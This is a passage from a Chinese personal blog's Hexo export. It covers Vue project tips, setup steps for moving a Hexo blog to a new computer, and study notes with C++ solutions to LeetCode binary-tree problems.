<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.prototype.$md5 = md5</span><br><span class="line">Vue.prototype.$sha256 = sha256</span><br></pre></td></tr></table></figure>

<p>调用的时候直接,</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.$md5(plaintext)</span><br><span class="line"><span class="built_in">this</span>.$sha256()</span><br></pre></td></tr></table></figure>

<h3 id="vue项目打包-生成dist文件"><a href="#vue项目打包-生成dist文件" class="headerlink" title="vue项目打包,生成dist文件"></a>vue项目打包,生成dist文件</h3><p>由于是使用vue-cli生成的项目</p>
<p>所以需要在根目录下面新建vue.config.js</p>
<p>不过前面配置跨域的时候弄过了,所以直接加一段进去就行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="attr">assetsDir</span>: <span class="string">&#x27;static&#x27;</span>,</span><br><span class="line">  <span class="attr">parallel</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">publicPath</span>: <span class="string">&#x27;./&#x27;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后直接<code>npm run build</code></p>
<h3 id="通过iframe内嵌B站视频的问题"><a href="#通过iframe内嵌B站视频的问题" class="headerlink" title="通过iframe内嵌B站视频的问题"></a>通过iframe内嵌B站视频的问题</h3><p>需要给链接<code>src</code>加上<code>https://</code>,否则请求路径有问题</p>
<h3 id="配置按键对应事件"><a href="#配置按键对应事件" class="headerlink" title="配置按键对应事件"></a>配置按键对应事件</h3><p>main.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.prototype.$keyBoard = <span class="function"><span class="keyword">function</span> (<span class="params">vm, methodName, code</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.onkeydown = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> key = <span class="built_in">window</span>.event.keyCode;</span><br><span class="line">    <span class="keyword">if</span> (key == code) &#123;</span><br><span class="line">      vm[methodName](code); <span class="comment">// 触发methodName事件</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>具体的vue代码中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mounted() &#123;</span><br><span class="line">    this.$keyBoard(this, &#x27;onClickEnter&#x27;, 13)     //13是enter按键  其他按键码自己查</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">methods: &#123;</span><br><span class="line">    onClickEnter() &#123;</span><br><span class="line"></span><br><span class="line">		//按下按键后要实现的代码写在这里</span><br><span class="line"></span><br><span class="line">	&#125;,    //这里使用绑定的按键事件</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="vue中页面布局需要刷新才正常显示的问题"><a href="#vue中页面布局需要刷新才正常显示的问题" class="headerlink" title="vue中页面布局需要刷新才正常显示的问题"></a>vue中页面布局需要刷新才正常显示的问题</h3><p>其实这个问题的起因是自己前端代码写的太烂,只需要在style添加scoped即可</p>
<p>因为每个vue文件都有自己对应的css样式。<br>因此需要在每个页面的style标签上加上scoped属性以表示它的样式仅对于当前页面生效。否则在从别的页面回退或跳转时因为相同的class 样式而导致冲突</p>
]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>关于blog迁移到不同设备</title>
    <url>/2024/09/29/%E5%85%B3%E4%BA%8Eblog%E8%BF%81%E7%A7%BB%E5%88%B0%E4%B8%8D%E5%90%8C%E8%AE%BE%E5%A4%87/</url>
    <content><![CDATA[<h4 id="安装nodejs和git"><a href="#安装nodejs和git" class="headerlink" title="安装nodejs和git"></a>安装nodejs和git</h4><p>这里没啥问题一般</p>
<p>安装好git之后需要配置一下用户名和电子邮件用于后续commit</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;你的用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;你的邮箱地址&quot;</span></span><br></pre></td></tr></table></figure>



<h4 id="配置ssh秘钥"><a href="#配置ssh秘钥" class="headerlink" title="配置ssh秘钥"></a>配置ssh秘钥</h4><p>如果已经有秘钥了则跳过此步骤,否则在命令行输入如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096</span><br></pre></td></tr></table></figure>

<p>生成的秘钥在</p>
<p><code>C:\Users\用户名\.ssh</code></p>
<p>复制公钥<code>.pub</code>添加到github的<code>settings-&gt;SSH and GPG keys</code>位置的ssh秘钥处即可</p>
<h4 id="克隆仓库到本地"><a href="#克隆仓库到本地" class="headerlink" title="克隆仓库到本地"></a>克隆仓库到本地</h4><p>没啥问题</p>
<h4 id="用npm安装js的模块"><a href="#用npm安装js的模块" class="headerlink" title="用npm安装js的模块"></a>用npm安装js的模块</h4><h5 id="先给npm换源"><a href="#先给npm换源" class="headerlink" title="先给npm换源"></a>先给npm换源</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npmmirror.com</span><br><span class="line">//验证是否成功</span><br><span class="line">npm config get registry</span><br></pre></td></tr></table></figure>

<h5 id="安装hexo所需的模块"><a href="#安装hexo所需的模块" class="headerlink" title="安装hexo所需的模块"></a>安装hexo所需的模块</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>

<p>hexo命令需要添加到环境变量path中</p>
<p>把<code>hexo\node_modules\.bin</code>添加到环境变量path中</p>
<p>这里也可以全局安装hexo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>



<p>到这里一般就成功了,后序有啥问题再记录一下</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>-hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉树</title>
    <url>/2024/09/28/%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><h2 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h2><h3 id="前序遍历"><a href="#前序遍历" class="headerlink" title="前序遍历"></a>前序遍历</h3><h4 id="144-二叉树的前序遍历"><a href="#144-二叉树的前序遍历" class="headerlink" title="144. 二叉树的前序遍历"></a><a href="https://leetcode.cn/problems/binary-tree-preorder-traversal/">144. 二叉树的前序遍历</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011111619.png" alt="image-20241001111143545"></p>
<h5 id="递归实现"><a href="#递归实现" class="headerlink" title="递归实现"></a>递归实现</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">preorder</span>(root);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="built_in">preorder</span>(root-&gt;left);</span><br><span class="line">        <span class="built_in">preorder</span>(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="非递归实现"><a href="#非递归实现" class="headerlink" title="非递归实现"></a>非递归实现</h5><p>思路：因为栈是后进先出，而二叉树的访问顺序是根左右，前序的处理顺序也是根左右，为了让左在右前面，所以右先入栈</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        st.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (!st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            TreeNode* temp = st.<span class="built_in">top</span>();</span><br><span class="line">            res.<span class="built_in">push_back</span>(temp-&gt;val);</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span> (temp-&gt;right) &#123;</span><br><span class="line">                st.<span class="built_in">push</span>(temp-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (temp-&gt;left) &#123;</span><br><span class="line">                st.<span class="built_in">push</span>(temp-&gt;left);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h3><h4 id="递归实现-1"><a href="#递归实现-1" class="headerlink" title="递归实现"></a>递归实现</h4><p>同上，改一下顺序就行</p>
<h4 id="94-二叉树的中序遍历"><a href="#94-二叉树的中序遍历" class="headerlink" title="94. 二叉树的中序遍历"></a><a href="https://leetcode.cn/problems/binary-tree-inorder-traversal/">94. 二叉树的中序遍历</a></h4><h5 id="非递归实现-1"><a href="#非递归实现-1" class="headerlink" title="非递归实现"></a>非递归实现</h5><p>四个字：一路向左</p>
<p>符合中序遍历的那种思路，第一个元素是最左边的元素</p>
<p>先将跟结点入栈，然后一直向左继续入栈，直到为空，然后出栈一个元素并记录，如果出栈元素有右孩子，则把他右孩子也入栈，然后从它的右孩子一路向左继续入栈直到为空，重复上述过程即可</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line"></span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        st.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (root-&gt;left) &#123;</span><br><span class="line">            st.<span class="built_in">push</span>(root-&gt;left);</span><br><span class="line">            root = root-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (!st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            TreeNode* temp = st.<span class="built_in">top</span>();</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            res.<span class="built_in">push_back</span>(temp-&gt;val);</span><br><span class="line">            TreeNode* temp2 = temp-&gt;right;</span><br><span class="line">            <span class="keyword">if</span> (temp2) &#123;</span><br><span class="line">                st.<span class="built_in">push</span>(temp2);</span><br><span class="line">                <span class="keyword">while</span> (temp2-&gt;left) &#123;</span><br><span class="line">                    st.<span class="built_in">push</span>(temp2-&gt;left);</span><br><span class="line">                    temp2 = temp2-&gt;left;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h3><h5 id="非递归实现-2"><a href="#非递归实现-2" class="headerlink" title="非递归实现"></a>非递归实现</h5><p>只需要在前序非递归实现的代码上稍作修改即可</p>
<p>将前序获得结果的顺序改为<code>根右左</code>然后再reverse一下即可</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        st.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (!st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            TreeNode* temp = st.<span class="built_in">top</span>();</span><br><span class="line">            res.<span class="built_in">push_back</span>(temp-&gt;val);</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span> (temp-&gt;left) &#123;</span><br><span class="line">                st.<span class="built_in">push</span>(temp-&gt;left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (temp-&gt;right) &#123;</span><br><span class="line">                st.<span class="built_in">push</span>(temp-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="层序遍历"><a href="#层序遍历" class="headerlink" title="层序遍历"></a>层序遍历</h3><h4 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="102. 二叉树的层序遍历"></a><a href="https://leetcode.cn/problems/binary-tree-level-order-traversal/">102. 二叉树的层序遍历</a></h4><p>思路：如果只是简单的序列就直接入队出队就行</p>
<p>本题是要求按层进行分数组存放</p>
<p>每一次要出队的元素就是当前队列大小，出队之后将自己的非空左右孩子入队即可</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">levelOrder</span>(TreeNode* root) &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; cur;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            num = que.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">while</span> (num--) &#123;</span><br><span class="line">                TreeNode* temp = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                cur.<span class="built_in">push_back</span>(temp-&gt;val);</span><br><span class="line">                <span class="keyword">if</span> (temp-&gt;left) &#123;</span><br><span class="line">                    que.<span class="built_in">push</span>(temp-&gt;left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (temp-&gt;right) &#123;</span><br><span class="line">                    que.<span class="built_in">push</span>(temp-&gt;right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="built_in">push_back</span>(cur);</span><br><span class="line">            cur.<span class="built_in">clear</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h2 id="二叉树的其他题目"><a href="#二叉树的其他题目" class="headerlink" title="二叉树的其他题目"></a>二叉树的其他题目</h2><h4 id="226-翻转二叉树"><a href="#226-翻转二叉树" class="headerlink" title="226. 翻转二叉树"></a><a href="https://leetcode.cn/problems/invert-binary-tree/">226. 翻转二叉树</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011112909.png" alt="image-20241001111201833"></p>
<p>本题很适合采用后续遍历，就是简单的交换左右子树，注意如果使用中序遍历交换过后还是继续递归左子树（即交换前的右子树）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">invertTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">invertTree</span>(root-&gt;left);</span><br><span class="line">        <span class="built_in">invertTree</span>(root-&gt;right);</span><br><span class="line">        <span class="built_in">swap</span>(root-&gt;left, root-&gt;right);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="101-对称二叉树"><a href="#101-对称二叉树" class="headerlink" title="101. 对称二叉树"></a><a href="https://leetcode.cn/problems/symmetric-tree/">101. 对称二叉树</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011112013.png" alt="image-20241001111225933"></p>
<p>这道题算是有点难度的，首先要解决的是两点问题</p>
<ol>
<li>遍历顺序  </li>
<li>返回值和返回的时机</li>
</ol>
<p>本题本质上是同时遍历两个树（即根结点的左右子树），检查是否对称肯定要从最底层开始，故采用后序遍历，</p>
<p>只有当不对称或者到底的时候才返回，最后综合inside和outside的值判断是否对称</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSymmetric</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">cmp</span>(root-&gt;left, root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(TreeNode* L, TreeNode* R)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (L == <span class="literal">NULL</span> &amp;&amp; R == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (L == <span class="literal">NULL</span> &amp;&amp; R != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (L != <span class="literal">NULL</span> &amp;&amp; R == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (L-&gt;val != R-&gt;val) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">bool</span> inside = <span class="built_in">cmp</span>(L-&gt;right, R-&gt;left);</span><br><span class="line">        <span class="keyword">bool</span> outside = <span class="built_in">cmp</span>(L-&gt;left, R-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> inside &amp;&amp; outside;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="104-二叉树的最大深度"><a href="#104-二叉树的最大深度" class="headerlink" title="104. 二叉树的最大深度"></a><a href="https://leetcode.cn/problems/maximum-depth-of-binary-tree/">104. 二叉树的最大深度</a></h4><p>二叉树的题目首先考虑遍历顺序,因为是深度,所以采用后序遍历从下往上返回每棵子树的最大深度</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">maxDepth</span>(root-&gt;left), <span class="built_in">maxDepth</span>(root-&gt;right)) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="111-二叉树的最小深度"><a href="#111-二叉树的最小深度" class="headerlink" title="111. 二叉树的最小深度"></a><a href="https://leetcode.cn/problems/minimum-depth-of-binary-tree/">111. 二叉树的最小深度</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011112129.png" alt="image-20241001111242052"></p>
<p>最小深度是指根节点到最近的叶子结点的路径上的结点个数,所以递归出口应该是一个叶子结点</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">minDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left == <span class="literal">NULL</span> &amp;&amp; root-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// 这里是递归出口</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left != <span class="literal">NULL</span> &amp;&amp; root-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// 只是改变递归方向</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">minDepth</span>(root-&gt;left) + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left == <span class="literal">NULL</span> &amp;&amp; root-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">minDepth</span>(root-&gt;right) + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 本质上还是后序遍历</span></span><br><span class="line">        <span class="keyword">int</span> leftHight = <span class="built_in">minDepth</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">int</span> rightHight = <span class="built_in">minDepth</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(leftHight, rightHight) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="222-完全二叉树的节点个数"><a href="#222-完全二叉树的节点个数" class="headerlink" title="222. 完全二叉树的节点个数"></a><a href="https://leetcode.cn/problems/count-complete-tree-nodes/">222. 完全二叉树的节点个数</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011113383.png" alt="image-20241001111304286"></p>
<p>这题学习到了好几个点:</p>
<ol>
<li>递归出口先确定这件事情很重要</li>
<li>位运算中左移0位相当于1次方,移1位相当于2次方</li>
<li>先中后序遍历看的是单层递归逻辑</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">countNodes</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 完全二叉树可以被拆分为多棵满二叉树</span></span><br><span class="line">        TreeNode* left = root-&gt;left;</span><br><span class="line">        TreeNode* right = root-&gt;right;</span><br><span class="line">        <span class="keyword">int</span> leftHight = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> rightHight = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (left) &#123;</span><br><span class="line">            leftHight++;</span><br><span class="line">            left = left-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (right) &#123;</span><br><span class="line">            rightHight++;</span><br><span class="line">            right = right-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (leftHight == rightHight) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">2</span> &lt;&lt; leftHight) - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> leftNum = <span class="built_in">countNodes</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">int</span> rightNum = <span class="built_in">countNodes</span>(root-&gt;right);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> leftNum + rightNum + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="110-平衡二叉树"><a href="#110-平衡二叉树" class="headerlink" title="110. 平衡二叉树"></a><a href="https://leetcode.cn/problems/balanced-binary-tree/">110. 平衡二叉树</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011113027.png" alt="image-20241001111315936"></p>
<p>平衡二叉树要求左右子树高度差不能超过1</p>
<ol>
<li>这里巧妙利用了-1来标识左右子树是不是平衡二叉树,若某一个子树已经失衡,则直接返回-1</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">postTraversal</span>(root) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">postTraversal</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> leftH = <span class="built_in">postTraversal</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">int</span> rightH = <span class="built_in">postTraversal</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">if</span> (leftH == <span class="number">-1</span> || rightH == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 肯定向上返回最大高度</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">abs</span>(leftH - rightH) &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(leftH, rightH) + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">abs</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123; <span class="keyword">return</span> a &gt; <span class="number">0</span> ? a : -a; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="遍历-回溯"><a href="#遍历-回溯" class="headerlink" title="遍历+回溯"></a>遍历+回溯</h3><h4 id="257-二叉树的所有路径"><a href="#257-二叉树的所有路径" class="headerlink" title="257. 二叉树的所有路径"></a><a href="https://leetcode.cn/problems/binary-tree-paths/">257. 二叉树的所有路径</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011113078.png" alt="image-20241001111326986"></p>
<p>本题求路径,注意一下几点</p>
<ol>
<li>求根结点到叶子结点的路径,用先序遍历</li>
<li>注意路径压栈的时机,要在收货结果之前,并且注意压栈元素与出栈元素的对应关系</li>
</ol>
